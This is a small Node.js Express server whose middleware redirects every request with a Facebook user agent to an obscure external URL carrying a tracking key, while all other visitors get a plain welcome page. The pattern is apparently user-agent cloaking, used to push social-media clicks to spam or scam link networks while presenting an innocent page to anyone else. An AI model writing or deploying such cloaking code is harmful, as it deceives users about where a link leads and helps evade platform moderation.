const express = require('express');
const app = express();

// Middleware to check if the request is from Facebook
app.use((req, res, next) => {
    const userAgent = req.get('User-Agent');
    if (userAgent && userAgent.includes('Facebook')) {
        // Redirect Facebook users
        res.redirect('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
    } else {
        next();
    }
});

// Define other routes and middleware here
app.get('/', (req, res) => {
    res.send('Welcome to the homepage!');
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
